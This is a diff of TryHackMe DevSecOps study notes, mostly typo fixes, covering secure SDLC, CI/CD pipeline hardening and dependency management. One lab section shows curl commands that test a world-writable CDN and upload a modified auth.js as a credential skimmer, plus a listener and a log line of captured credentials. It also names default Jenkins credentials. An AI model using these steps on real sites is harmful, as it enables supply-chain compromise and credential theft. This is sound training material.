@@ -1,7 +1,7 @@
-####Devsecops on thm focuses on securing pipelines throuh Iac and extends to containerization security.
+####Devsecops on thm focuses on securing pipelines through Iac and extends to containerization security.
 #secure software development workflow
 #Objectives
-#Into to Devsecops(Secure SDLC, environments and tools)
+#Intro to Devsecops(Secure SDLC, environments and tools)
 #SDLC
 #SSDLC(Secure Software Development LifeCycle)
 #Security of Pipeline(Pipeline automation, Source code security, Automated Code Testing, Dependency Management, CI/CD and Environment Security)
@@ -19,7 +19,7 @@ DevOps emphasises "BUILDING TRUST"
 collaborative culture between DEVELOPMENT and SECURITY.
 Benefits:
 - Risks are reduced massively because security is introduced early in the SDLC
-- No unnecessary stress because bug are discovered in later stages of SDLC s before
+- No unnecessary stress because bugs are discovered in later stages of SDLC before
 - No constant rollbacks because bugs are discovered in later stages
 - No economic losses as a result of discovering security flaws or bugs late.
 - Security flaws are discovered in early stages and these prevent stress, rollbacks and economic losses.
@@ -250,14 +250,14 @@ There are several methodologies used, but some of the popular ones are:
 - OWASP Secure Software Development Lifecycle Project (S-SDLC)
 - Software Security Touchpoints
 SDL's principles:
-- Secure by design - Security is in-built in the whole software lifecycle
+- Secure by Design - Security is in-built in the whole software lifecycle
 - Secure by Default - Software are built to minimize potential harm caused by attackers. e.g deploying software with least privilege
 - Secure in Development- deployment should be accompanied by tools and guidance supporting users and admins
 - Communications - communications openly and freely with users and admins about threats
 OWASP S-SDLC
 High Level Security Risk Analysis - GATE 1(Agreement Concept/Priority) - Project Definition
 Controls Selection - GATE 2(Agreement Project Definition) - Preliminary Design
-Security Design Recview - GATE 3(Agreement Preliminary Design) - Detailed Design and Development
+Security Design Review - GATE 3(Agreement Preliminary Design) - Detailed Design and Development
 Penetration testing - GATE 4(Agreement Approve Build) - Deployment
 SAMM is the Maturity Model that helps you measure TAILORED RISKS facing your organization.
 BSIMM is the MATURITY MODEL that acts a measuring stick to determine your security posture.
@@ -275,7 +275,7 @@ Automated Testing:
 Integration part of the pipeline. For CICD. A subset of it is REGRESSION TESTING. Not usually performed for security purposes.
 - SAST: Used to scan source codes for vulnerabilities. Integrated to the dev process or CICD.
 - DAST: Used to detect additional vulnerabilities that would not have been detected by ordinary code review(SAST) e.g cross site scripting
-attack XSSlb,vvncmbmvn nnvbnvvvc,bv,v v mccmm,v,m;b;.h.h
+attack XSS
 - Pentration Testing: Used to detect what automated testing cannot. What IAST, RASP, SAST, and DAST cannot detect e.g
 1) Credit card payment bypass
 2) Business logic
@@ -285,7 +285,7 @@ Snyk is a polpular SAST tool
 Sonarqube is a popular SAST tool
 COMMON MISCONFIGURATION WITH CICD PIPELINE:  Using the same BUILD AGENTS for both DEVELOPMENT(DEV) and PRODUCTION(PROD)
 Since most devs will have access to starting trigger in both DEV and PROD. If one of the devs were compromised, an attacker could exploit the
-their access t;;vvuiuyuohoyhhyyyyyyuyyyyhgggttyiyuytutv,hbbbbmggh,bo cause a MALICIOUS DEV build that would compromise the BUILD AGENT. Since the same agent is used for PROD too, an attacker
+their access cause a MALICIOUS DEV build that would compromise the BUILD AGENT. Since the same agent is used for PROD too, an attacker
 could persist exploiting this to PROD and inject it compromise the production environment/application.
 Devs Bypasses in Prod:
 - MFA
@@ -298,7 +298,7 @@ Devs Bypasses in Prod:
 - Improper usage of credentials in build
 - Improper usage of credentials in deployment processes
 - Leaving credentials in container image layers
-- Printing crdentials to console outputs
+- Printing credentials to console outputs
 - Neglecting to rotate credentials
 All the above can cause security breaches.
 
@@ -308,8 +308,8 @@ To prevent the above, practice or implement the below:
 - Use temporary credentials and rotate credentials as frequent as possible
 - Use credentials only in predefined conditions e.g using it for specifc IP address or identity
 - Use IDE plugins, automatic scanning, and periodic repo commit scans to detect secrets pushed to and stored in code repo
-- Use tools to prevent secrets being printed on cosnole
-- Vvalidate removal secrets from artifacts.
+- Use tools to prevent secrets being printed on console
+- Validate removal secrets from artifacts.
 - Use environment variables.
 
 ######PIPELINES
@@ -326,7 +326,7 @@ either your repo and Jenkins. In order to connect to them, you can access your r
 4) Validate the login of your repo or set up, by running this on a browser- "http://gitlab.tryhackme.loc "
 
 #CICD AND BUILD SECURITY
-A secure build environment is important to mitigate against POTENTIIAL threats and vulnerabilities
+A secure build environment is important to mitigate against POTENTIAL threats and vulnerabilities
 Lessons learnt from "SOLAR WINDS SUPPLY CHAIN ATTACK" is implemented in this module.
 The 8 FUNDAMENTALS OF CICD ACCORDING TO GITLAB:
 1) A single source repo: use single source repo to store all the required files and scripts to build the app
@@ -351,7 +351,7 @@ against a single point of compromise. When you implement CONTAINERIZATION and VI
 in different stages, the entire system is not going to be compromised. When you ensure a STRICT ACCESS CONTROLS or create SANDBOXES to
 execute SECURE BUILD PROCESSES, it will will prevent the exposure of the entire ENVIRONMENT.
 - Set up appropriate access controls- Limit unauthorized access to the BUILD ENVIRONMENT to ensure the INTEGRITY and SECURITY of the system
-1) Implement least privilege princip;e
+1) Implement least privilege principle
 2) Implement MFA
 3) Enforce strong password policies
 4) Regularly review and update the access controls to ensure that the policies align with least privilege
@@ -383,7 +383,7 @@ PUSH new codes to the repo.
 2) Unauthorized disclosure: Prevent against disclosing source code that is sensitive e.g Microsoft won't want to disclose Word source code.
 Protect the IP
 #CONFUSION OF RESPONSIBILITIES
-Confusion of responsibilities always seep in large organizations mainly sue to management of granular access control or misconfiguration
+Confusion of responsibilities always seep in large organizations mainly due to management of granular access control or misconfiguration
 e.g
 - Leaving registration for code repo e.g Gitlab instance open to any user i.e all users internally
 It may not be a DIRECT RISK but the attack surface grows e.g a bank having a 10,000 employees, and 2000 out of the 10,000 are devlopers, who
@@ -466,7 +466,7 @@ Deciding what actions can START the build process. By default, a commit to the p
 GRANULAR CONFIGURATION will reduce the attack surface e.g DECIDING THAT ONLY COMMITS TO SPECIFIC BRANCH e.g main/master should start the
 PIPELINE. This way developers can make COMMITS to their branches directly. SO FAR the ability to COMMIT to the MAIN BRANCH or APPROVE MERGE
 REQUEST is LIMITED, the attack surface of the pipeline will be limited.
-To really tackle this and prevent the complications that arise from Mmerge request or breaking of pipeline through its activities, we can
+To really tackle this and prevent the complications that arise from merge request or breaking of pipeline through its activities, we can
 consider using multiple branches/ environments before it reaches main/master - i.e run the pipeline in build environment, then qa , then uat
 before running it in main that deploys to production. If anything will break the pipeline, you would have known before it gets to prod.
 There could be a manual approval created to kick off to prod too.
@@ -496,7 +496,7 @@ If the CI/CD is enabled by default, it means any user can modify the source and 
 Where should you store artefacts to prevent tampering? Secure registry
 What mechanism should you always use to store and inject sensitive data? Secret management
 What attack can malicious actors perform to inject malicious code in the build process? Dependency confusion
-Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1? THM{7753f7e9-6543-4914-90ad-7153609831c3}
+Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1?
 
 #Securing the Build Server
 - Access ( Attack can guess credentials and gain access). With Jenkins, jenkins:jenkins could do the trick sometimes
@@ -540,10 +540,10 @@ They ensure that code progresses ONLY after MEETING predefined quality and secur
 - Automated tests - for code quality, unit tests, integration tests etc
 - Security scan - integrate security scan tools to detect vulnerability in the code base.
 - Release gates - Use gates to verify proper documentation, versioning and compliance.
-- Environment validation - validate the readines of the target environment before deployment
+- Environment validation - validate the readiness of the target environment before deployment
 - Roll back plan - include a gate for roll back plan in case of post-deployment issues
 - Monitoring - Implement monitoring to monitor progress of deployment and post-deployment
-- Parallel gates- Run parallel gates to expedite the piepline without compromise
+- Parallel gates- Run parallel gates to expedite the pipeline without compromise
 - Audit - Regularly review gate configurations
 #The Two Person Concept:
 No user must be able to pass any access gate single-handedly. Each access gates should require at least 2 users to be able to progress.
@@ -555,7 +555,7 @@ So eventhough, pushes are not directly to the main branch, devs can still make p
 could exploit this.
 #Protecting Pipeline
 - Limit Branch Access: Only trusted devs should be given access to push to the main branch. Configure branch protection rules to require
-reviews before allowing changes- Seetings/Repo/Default branch
+reviews before allowing changes- Settings/Repo/Default branch
 - Review Merge Request: Enforce merge requests (or pull requests) to make main branch changes. Configure a merge request approvals to
 ensure multiple team members review and approve changes.
 - Use CI/CD Variables: Use CI/CD variables to STORE secrets like API keys, passwords, and tokens.
@@ -611,8 +611,8 @@ Modern apps are not built from the ground up anymore. Modern apps use LIBRARIES 
 features of the application. The libraries and SDKs are called dependencies and they need to be managed.
 #The scale of dependency
 The "import numpy" is a dependency in python that takes care of more than 250 lines of codes for you already. Every single line where the 
-numpy library is used is 250 lines of codes at least. So when you use it, it streamlines your code and makes it more enables you to focus on
-the functionalities. However, you need to manage this numpy dependency e.g
+numpy library is used is 250 lines of codes at least. So when you use it, it streamlines your code and makes it more focus on
+the functionalities. However, the numpy dependency needs to be managed e.g
 
 #!/usr/bin/python3
 #Import the OS dependency
@@ -648,7 +648,7 @@ Would JQuery be considered an internal or external dependency? external
 Are the ones that are HOSTED, MANAGED and UPDATED by EXTERNAL PARTIES.
 ###One of the attacks that can be targeted at EXTERNAL DEPENDENCIES is a SUPPLY CHAIN ATTACK.
 #PUBLIC CVES
-There are going to be vulnerabilities in the code they were written by developers for an app. The vulnerabilities will be disclosed publicly
+There are going to be vulnerabilities in the code that were written by developers for an app. The vulnerabilities will be disclosed publicly
 and they will patch them to rectify that. However, since vulnerabilities are disclosed publicly, they are open to attackers too. It may not be
 easy for those using the apps to react quickly to patching them and unfortunately, these are what attackers will target. They will exploit
 it- looking for systems that still have the vulnerabilities and they exploit.
@@ -675,7 +675,7 @@ to allow this, it means anybody externally can access it and gain the control of
 #THE SIMULATION (LAB FOR THIS EXPLOIT)
 - Need to set up a S3 bucket hostname- run the below command to set up an internet facing s3 bucket i.e you write to hosts in etc to host it
 sudo bash -c "echo 'MACHINE_IP cdn.tryhackme.loc' >> /etc/hosts"
-- You can REFRESH your webpage to see your dependency in the internet-facing s3 bucket
+- You can REFRESH your webpage to see the dependency in the internet-facing s3 bucket
 - To inspect the code of the app. Right Click on "View Source", it will show you DEPENDENCY from cdn.tryhackme.loc
 - Further "inspect the dependency", by opening a link to the dependency, an "auth.js" should be able to be downloaded- see the below:
 //This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!
@@ -698,7 +698,7 @@ command- by trying a PUT REQUEST i.e running "Curl -X PUT"
 curl -X PUT http://cdn.tryhackme.loc:9444/libraries/test.js -d "Testing world-writeable permissions"
 If you get an "HTTP 200 OK" or able to DOWNLOAD "http://cdn.tryhackme.loc:9444/libraries/test.js. " , it is good for a possible SUPPLY
 CHAIN ATTACK.
-- The supply chain attack could be in different ways to exploit this worl writable permission, but going simple by EMBEDDING A CREDENTIAL
+- The supply chain attack could be in different ways to exploit this world writable permission, but going simply by EMBEDDING A CREDENTIAL
 SKIMMER that will SEND A USER'S CREDENTIAL WHEN THEY CLICK "SUBMIT" i.e modify the code auth.js file 
 - Download the auth.js file
 - Modify it to the below:
@@ -736,7 +736,7 @@ browser would stop the request from occurring.
 curl http://cdn.tryhackme.loc:9444/libraries/auth.js --upload-file auth.js
 - Spin up a server that will receive the keystrokes from the inetrnet-facing s3 bucket, by running the below command
 python3 -m http.server 7070
-- To test whether the skimmer will work or not, initiate a test on the ineternet-facing s3 bucket website, by entering your credentials
+- To test whether the skimmer will work or not, initiate a test on the internet-facing s3 bucket website, by entering your credentials
 and submit, you should intercept your password.
 10.10.62.64 - - [10/Aug/2022 10:59:28] "GET /item?user=test&pass=test HTTP/1.1" 404 -
 - Once a user authenticates, we should get the user's keystrokes.
@@ -807,8 +807,8 @@ it is also important to be familiar with or know the owasp top 10 and owasp api 
 
 #code review
 you need to carry out code review to test your code for security bugs. code review means testing your code for security bugs
-using a white box approach to search for vulnerabilities ata early stage of sdlc instead of later is important.
-vulnerabilities that are not detected at early stage because there is no code review or search for vulnerabilities will surfaceat the
+using a white box approach to search for vulnerabilities at early stage of sdlc instead of later is important.
+vulnerabilities that are not detected at early stage because there is no code review or search for vulnerabilities will surface at the
 end of the project and more laborious to fix.
 code review early on in an sdlc will guarantee:
 - early bug fix
@@ -817,9 +817,9 @@ code review early on in an sdlc will guarantee:
 cost of defects increases from design to maintenance stage i.e --------> design -- coding(development) -- testing -- maintenance
 ##manual vs automated coding
 #manual code review
-- human involvement ensures that thorough review and analysis is carried, 
-- but more laborious if there is thousands lines of code to be reviewed
-- inconsistency because of thousands lines of code to be reviewed
+- human involvement ensures that thorough review and analysis is carried out, 
+- but more laborious if there is thousands lines of code to be reviewed.
+- inconsistency because of thousands lines of code to be reviewed.
 - cost is higher, because human is involved and spends a lot of time doing the review
 #automated code review (this where sast tools are used)
 - less laborious - faster
@@ -863,7 +863,7 @@ first step in code review is to search for - insecure functions in use
     return $result;
 }
 #analysis
-- the "msql_query" function is wrapped inside the "db_query" function. it is nested inside it
+- the "mysql_query" function is wrapped inside the "db_query" function. it is nested inside it
 - unfortunately, there is a "$query" parameter that is passed without modification i.e it is in plain sight. anybody can exploit and modify this
 - the problem at hand now is to find what "db_query" is used for in the application
     - use grep to search for where "db_query" is used in the application
@@ -912,7 +912,7 @@ first step in code review is to search for - insecure functions in use
 - include_once()
 ####finding vulnerabilities in your application for lfi
 - run "grep" to search for where the specified queries can be found in your application
-- investigation the use cases of each
+- investigate the use cases of each
 - run a get call to check the vulnerabilites
 - validate what can be exploited
 - all these will be done by running it in the php file in the application.
